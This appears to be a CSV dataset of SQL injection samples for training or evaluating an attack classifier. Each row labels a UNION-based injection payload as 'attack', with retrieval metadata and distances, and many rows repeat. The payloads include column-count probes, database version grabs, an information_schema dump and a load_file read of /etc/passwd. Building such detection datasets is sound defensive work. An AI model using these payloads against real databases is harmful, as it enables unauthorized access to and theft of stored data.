id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000015,attack,union,"-6789'||  (  select 'uckz' from dual where 2163  =  2163 union all select 2163,2163,2163,2163,2163,2163--",nearest_attack_euclidean,R000066,0.20543051289602282
SMOTE_000016,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,0.03926865255432245
SMOTE_000017,attack,union," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000035,0.7543472415069493
SMOTE_000018,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,1.007759682220589
SMOTE_000019,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.29151179282347117
SMOTE_000020,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,0.4642065665201385
SMOTE_000021,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.22434298443627892
SMOTE_000022,attack,union,"-4876""   )    )    as saug where 2256  =  2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",nearest_attack_euclidean,R000127,0.35697147320098244
SMOTE_000023,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.4474053577506278
SMOTE_000024,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,0.726502980400352
SMOTE_000025,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000132,0.10743245466442126
SMOTE_000026,attack,union," select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000009,2.6931358939216135
SMOTE_000027,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.2686878114334278
SMOTE_000028,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.3960481486090753
SMOTE_000029,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.02487792443854508
SMOTE_000030,attack,union,-6912' in boolean mode  )   union all select 6012--,nearest_attack_euclidean,R000141,0.402867743905921
SMOTE_000031,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000036,0.7852574982372287
SMOTE_000032,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000062,1.3120795772622849
SMOTE_000033,attack,union,"-3370' in boolean mode  )   union all select 3432,3432,3432,3432#",nearest_attack_euclidean,R000125,0.06773258650380498
SMOTE_000034,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,1.6787676404910943
SMOTE_000035,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,0.04119573984935599
SMOTE_000036,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,0.06518760211474856
SMOTE_000037,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.2682616350841156
SMOTE_000038,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.3637846836779785
SMOTE_000039,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.455828840528393
SMOTE_000040,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,0.4353134158867548
SMOTE_000041,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,1.5866639918563992
SMOTE_000042,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000078,0.28430571079363354
SMOTE_000043,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.38706020054153867
SMOTE_000044,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000057,0.35927140676770003
SMOTE_000045,attack,union,"-2798'+  (  select 'emui' where 9565  =  9565 union all select 9565,9565,9565,9565--",nearest_attack_euclidean,R000150,0.3665694427863287
SMOTE_000046,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R000044,0.3050948171311871
SMOTE_000047,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,1.5323629801658218
SMOTE_000048,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.5654732956227799
SMOTE_000049,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.41011444679808895
SMOTE_000050,attack,union," )   union select * from information_schema.tables,",nearest_attack_euclidean,R000018,4.5019271836623
SMOTE_000051,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.10033753905476372
SMOTE_000052,attack,union," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000011,6.610375955394068
SMOTE_000053,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000121,0.008234738523347654
SMOTE_000054,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,0.015055965570977358
SMOTE_000055,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000076,0.05069560192673581
SMOTE_000056,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.4552331348058865
SMOTE_000057,attack,union,"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",nearest_attack_euclidean,R000072,0.047249029404572374
SMOTE_000058,attack,union," union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",nearest_attack_euclidean,R000007,10.864884618376134
SMOTE_000059,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000139,0.42373052550527324
SMOTE_000060,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.3608942347070742
SMOTE_000061,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,0.19855574549610128
SMOTE_000062,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,0.06204898133745251
SMOTE_000063,attack,union,"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",nearest_attack_euclidean,R000053,0.006832329602096302
SMOTE_000064,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.009219914112898962
SMOTE_000065,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000098,0.6927626963527295
SMOTE_000066,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000087,0.09794356623327527
SMOTE_000067,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,0.6103057219463598
SMOTE_000068,attack,union,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",nearest_attack_euclidean,R000040,0.5086294612349881
SMOTE_000069,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,0.20864699532233796
SMOTE_000070,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000089,0.11616805431938848
SMOTE_000071,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,1.3209709492980086
SMOTE_000072,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,0.6649205506853109
SMOTE_000073,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,1.6000250650395953
SMOTE_000074,attack,union," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",nearest_attack_euclidean,R000013,0.4340754319380188
SMOTE_000075,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,1.6858739404357614e-07
SMOTE_000076,attack,union," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000027,0.12096470341145617
SMOTE_000077,attack,union,"1' in boolean mode  )   union all select null,null--",nearest_attack_euclidean,R000049,3.7239056263890746
SMOTE_000078,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000036,0.33882411186465555
SMOTE_000079,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.3862665330988015
SMOTE_000080,attack,union,"-5008' union all select 1942,1942,1942,1942,1942,1942,1942,1942--",nearest_attack_euclidean,R000112,0.35618433833984886
SMOTE_000081,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.20722729349540334
SMOTE_000082,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.056347669453678736
SMOTE_000083,attack,union,"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",nearest_attack_euclidean,R000098,0.6975658077141182
SMOTE_000084,attack,union,"-7637"" union all select 8498,8498,8498--",nearest_attack_euclidean,R000124,0.2791197090339321
SMOTE_000085,attack,union,"-6186' in boolean mode  )   union all select 2990,2990,2990#",nearest_attack_euclidean,R000132,0.5082789477368024
SMOTE_000086,attack,union,"-7945%'   )    )     )   union all select 4286,4286,4286,4286,4286,4286--",nearest_attack_euclidean,R000057,1.0632459141082404
SMOTE_000087,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000033,1.8128853725636287
SMOTE_000088,attack,union,"-7848%"" union all select 1580,1580,1580,1580,1580,1580,1580--",nearest_attack_euclidean,R000100,0.24334854523161759
SMOTE_000089,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,0.2721827531946463
SMOTE_000090,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000034,1.9739383123461276
SMOTE_000091,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R000137,0.9711594146819051
SMOTE_000092,attack,union," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000024,0.6360005016537783
SMOTE_000093,attack,union,"-7194'||  (  select 'gbrx' from dual where 6205  =  6205 union all select 6205,6205,6205,6205,6205,6205,6205#",nearest_attack_euclidean,R000070,0.5823558476766455
SMOTE_000094,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000119,0.4946720973580897
SMOTE_000095,attack,union,"-3997'+  (  select 'avjk' where 1917  =  1917 union all select 1917,1917,1917--",nearest_attack_euclidean,R000116,0.385082827551945
SMOTE_000096,attack,union,"-5509%""   )    )     )   union all select 7066,7066,7066,7066,7066,7066,7066,7066,7066,7066--",nearest_attack_euclidean,R000062,0.11046941667340694
SMOTE_000097,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,0.6453165734932685
SMOTE_000098,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,1.5089876338643675
SMOTE_000099,attack,union,"-4993"" union all select 6959,6959,6959--",nearest_attack_euclidean,R000120,1.2666104129158657
SMOTE_000100,attack,union," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",nearest_attack_euclidean,R000034,0.5820410883185426
SMOTE_000101,attack,union,"-8258""   )    )    as swjp where 2681  =  2681 union all select 2681,2681,2681,2681,2681,2681--",nearest_attack_euclidean,R000145,0.9195646902535044
SMOTE_000102,attack,union,"-4318""  )   as vpvt where 5543  =  5543 union all select 5543,5543,5543,5543,5543,5543--",nearest_attack_euclidean,R000084,0.2993832993596258
SMOTE_000103,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.07771465920566609
SMOTE_000104,attack,union,"-2643%"" union all select 7779,7779--",nearest_attack_euclidean,R000099,0.2727378517026037
SMOTE_000105,attack,union," select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000010,1.9137359559604907
SMOTE_000106,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000091,0.9934951530409363
SMOTE_000107,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.7847245642558344
SMOTE_000108,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000143,0.2342025138050361
SMOTE_000109,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,0.9273446525380705
SMOTE_000110,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.2894335616194106
SMOTE_000111,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000143,0.04614705047667018
SMOTE_000112,attack,union,"-8677'||  (  select 'ihpm' from dual where 9571  =  9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",nearest_attack_euclidean,R000128,0.4054861246916092
SMOTE_000113,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.35483111720686294
SMOTE_000114,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,0.777006543641711
SMOTE_000115,attack,union,"-5300' union all select 2750,2750,2750,2750,2750,2750--",nearest_attack_euclidean,R000065,0.3745518951004354
SMOTE_000116,attack,union,"-9758'+  (  select 'rlcy' where 3691  =  3691 union all select 3691,3691,3691,3691,3691,3691,3691--",nearest_attack_euclidean,R000139,0.49900838855532587
SMOTE_000117,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,0.01568367516007959
SMOTE_000118,attack,union," select * from users where id  =  '1' or \.<\ union select 1,@@VERSION -- 1'",nearest_attack_euclidean,R000001,0.25467463685266206
SMOTE_000119,attack,union,"-2001'+  (  select 'nput' where 8368  =  8368 union all select 8368,8368,8368,8368,8368,8368,8368,8368,8368#",nearest_attack_euclidean,R000110,1.426488102403964
SMOTE_000120,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,0.2894133096828185
SMOTE_000121,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,1.1550873071710492
SMOTE_000122,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,0.012801058249460918
SMOTE_000123,attack,union," select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000006,1.0722874170265049
SMOTE_000124,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000021,0.9301483862137866
SMOTE_000125,attack,union,"-9098'||  (  select 'xodn' from dual where 8202  =  8202 union all select 8202,8202,8202,8202,8202,8202,8202--",nearest_attack_euclidean,R000138,0.023831899225906197
SMOTE_000126,attack,union," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000014,1.069981387116122
SMOTE_000127,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000059,1.7774952780576772
SMOTE_000128,attack,union," select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000003,0.060997049116910826
SMOTE_000129,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R000056,0.33480625895395594
SMOTE_000130,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.43877634384503433
SMOTE_000131,attack,union,"-4694%""   )    )     )   union all select 9178,9178,9178,9178,9178--",nearest_attack_euclidean,R000109,0.9194499131616573
SMOTE_000132,attack,union," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000036,1.608882485629022
SMOTE_000133,attack,union,"-2314%'   )    )    union all select 4612,4612--",nearest_attack_euclidean,R000041,0.23791335133724964
SMOTE_000134,attack,union,"-6086"" union all select 8700,8700,8700,8700--",nearest_attack_euclidean,R000093,0.40269172483846505
SMOTE_000135,attack,union," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000033,0.2849228994925963
SMOTE_000136,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000119,0.1582746273655179
SMOTE_000137,attack,union,"-3667%'   )    )    union all select 3560,3560,3560--",nearest_attack_euclidean,R000107,0.3258012732834607
SMOTE_000138,attack,union,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",nearest_attack_euclidean,R000039,0.345961512518113
SMOTE_000139,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,0.18626054747081178
SMOTE_000140,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,0.11078666033168635
SMOTE_000141,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,0.32054539673946436
SMOTE_000142,attack,union,"-8128""   )    )    as ovjz where 7375  =  7375 union all select 7375,7375,7375,7375,7375,7375,7375,7375,7375--",nearest_attack_euclidean,R000073,0.500616174882358
SMOTE_000143,attack,union,"-7627%""   )    )    union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",nearest_attack_euclidean,R000142,0.737196114623863
SMOTE_000144,attack,union,"-3924'||  (  select 'ssld' from dual where 6229  =  6229 union all select 6229,6229,6229,6229,6229#",nearest_attack_euclidean,R000146,0.00031954520916186997
SMOTE_000145,attack,union,"-3250%"" union all select 7162,7162,7162,7162,7162,7162,7162,7162,7162--",nearest_attack_euclidean,R000119,0.10174354992572922
SMOTE_000146,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000148,0.17714729693413145
SMOTE_000147,attack,union," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",nearest_attack_euclidean,R000022,0.8008521468196653
SMOTE_000148,attack,union," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",nearest_attack_euclidean,R000019,0.38725108285029536
SMOTE_000149,attack,union,"-1236'+  (  select 'fbgh' where 3896  =  3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",nearest_attack_euclidean,R000051,0.8755098910169967
SMOTE_000150,attack,union,"-5516'+  (  select 'bmlv' where 7188  =  7188 union all select 7188,7188,7188,7188,7188,7188,7188,7188#",nearest_attack_euclidean,R000154,0.23345369303479238
SMOTE_000151,attack,union,"-7485""   )    )    as caob where 4100  =  4100 union all select 4100,4100,4100,4100,4100,4100,4100,4100--",nearest_attack_euclidean,R000055,0.04503752045101809
SMOTE_000152,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000030,0.1610234732320863
SMOTE_000153,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000105,0.6909092841546728
SMOTE_000154,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000147,0.8315729981153293
SMOTE_000155,attack,union,"-4452%"" union all select 7141,7141,7141,7141,7141,7141,7141,7141--",nearest_attack_euclidean,R000129,0.43389255528079756
SMOTE_000156,attack,union,"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",nearest_attack_euclidean,R000106,0.1701043153784038
SMOTE_000157,attack,union,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",nearest_attack_euclidean,R000047,0.5434574370168125
SMOTE_000158,attack,union,"-9734'   )    )    as izbx where 6273  =  6273 union all select 6273,6273,6273,6273,6273,6273,6273,6273,6273--",nearest_attack_euclidean,R000068,0.3306765503592282
SMOTE_000159,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,0.9600136127921173
SMOTE_000160,attack,union,"-7378' union all select 2071,2071,2071,2071,2071,2071,2071--",nearest_attack_euclidean,R000089,0.05773091125150108
SMOTE_000161,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,0.5198015503482447
SMOTE_000162,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R000076,0.347852658350939
SMOTE_000163,attack,union,"-1676'||  (  select 'xzmu' from dual where 6373  =  6373 union all select 6373,6373--",nearest_attack_euclidean,R000067,0.09024474576352746
SMOTE_000164,attack,union,"-6389"" union all select 2355,2355,2355,2355,2355--",nearest_attack_euclidean,R000056,0.24476815776461636
SMOTE_000165,attack,union,"-2364'+  (  select 'qdut' where 7560  =  7560 union all select 7560,7560,7560,7560,7560--",nearest_attack_euclidean,R000149,0.5053898510682181
SMOTE_000166,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.36168177470968677
SMOTE_000167,attack,union,"-1998'  )   as kgvf where 2346  =  2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",nearest_attack_euclidean,R000052,0.17466452236947833
SMOTE_000168,attack,union,"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",nearest_attack_euclidean,R000151,0.08704542214516561
SMOTE_000169,attack,union," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",nearest_attack_euclidean,R000012,0.18174499722482082
SMOTE_000170,attack,union,"-1876'||  (  select 'itfc' from dual where 9584  =  9584 union all select 9584,9584,9584,9584,9584,9584,9584,9584--",nearest_attack_euclidean,R000134,0.5306797974695222
SMOTE_000171,attack,union,"-3593%' union all select 6346,6346,6346,6346,6346,6346--",nearest_attack_euclidean,R000061,0.271233173621392
SMOTE_000172,attack,union,"-3620'||  (  select 'kmei' where 8533  =  8533 union all select 8533,8533,8533,8533--",nearest_attack_euclidean,R000097,0.5264106451686482
SMOTE_000173,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000108,0.3449991118602747
SMOTE_000174,attack,union,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",nearest_attack_euclidean,R000046,0.0058396754780545065
SMOTE_000175,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000087,0.23198068313161685
SMOTE_000176,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,0.7607111420752528
SMOTE_000177,attack,union,"-5396'||  (  select 'fjhd' from dual where 4019  =  4019 union all select 4019,4019,4019,4019#",nearest_attack_euclidean,R000081,0.1345909775241351
